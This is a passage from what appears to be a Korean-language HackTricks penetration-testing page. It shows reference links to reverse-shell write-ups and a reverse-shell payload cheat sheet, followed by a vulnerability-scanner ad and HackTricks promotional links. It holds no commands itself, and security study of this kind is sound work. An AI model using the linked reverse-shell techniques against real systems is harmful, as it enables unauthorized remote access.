* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정할 수 있습니다. Intruder는 공격 대상을 추적하고 적극적인 위협 스캔을 실행하여 API부터 웹 애플리케이션 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.

</details>
